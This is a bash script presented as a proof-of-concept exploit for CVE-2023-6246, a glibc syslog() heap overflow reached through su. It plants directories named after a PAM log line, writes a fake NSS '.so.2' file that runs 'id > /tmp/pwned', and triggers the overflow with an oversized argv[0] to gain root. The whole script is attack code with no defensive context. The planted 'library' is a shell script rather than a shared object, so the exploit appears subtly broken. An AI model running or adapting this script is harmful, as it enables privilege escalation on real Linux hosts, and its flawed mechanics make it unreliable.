#!/bin/bash
# Proof of Concept for CVE-2023-6246
# Heap-based buffer overflow in glibc's syslog()

# Create necessary directories and malicious library
mkdir -p "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty="
mkdir -p "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev"
mkdir -p "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts"

echo '#!/bin/bash' > "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost= user=root.so.2"
echo 'id > /tmp/pwned' >> "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost= user=root.so.2"
chmod +x "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost= user=root.so.2"

# Trigger the vulnerability
exec -a "$(printf 'A%.0s' {1..1025})" /usr/bin/su -w "$(printf 'A%.0s' {1..100})" < /dev/null